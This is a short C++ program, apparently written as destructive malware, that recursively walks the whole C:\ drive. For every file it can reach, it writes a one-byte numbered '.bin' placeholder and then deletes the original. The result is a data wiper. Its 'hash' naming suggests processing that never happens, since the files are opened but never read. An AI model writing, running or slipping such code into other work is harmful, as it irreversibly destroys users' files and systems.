#include <cstdint>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>

int main() {
    char zero = '\0';
    std::filesystem::path root = "C:\\";
    std::vector<std::string> paths;
    std::vector<std::string> fileppaths;

    auto options = std::filesystem::directory_options::skip_permission_denied;

    for (const auto& file : std::filesystem::recursive_directory_iterator(root, options)) {
        if (std::filesystem::is_regular_file(file.path())) {
            paths.push_back(file.path().string());
            fileppaths.push_back(file.path().parent_path().string());
        }
    }

    for (std::uint64_t j = 0; j < paths.size(); ++j) {
        std::ifstream file(paths[j], std::ios::binary);
        std::fstream hash(fileppaths[j] + "\\" + std::to_string(j) + ".bin", std::ios::binary | std::ios::out);
        hash.write(&zero, 1);
        std::filesystem::remove(paths[j]);
    }
    return 0;
}